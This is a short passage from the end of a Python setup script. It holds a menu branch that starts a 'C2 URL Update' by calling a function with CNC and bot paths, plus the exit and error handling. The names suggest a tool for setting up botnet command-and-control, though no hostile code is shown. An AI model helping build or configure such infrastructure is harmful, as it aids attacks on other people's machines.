        info("Starting C2 URL Update...")
        run_c2_update(base_path, cnc_path, bot_path)
    elif choice == "0":
        print("\nExiting.")
        sys.exit(0)
    else:
        error("Invalid option")
        sys.exit(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Setup cancelled by user.{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}Error: {e}{Colors.RESET}")
        sys.exit(1)
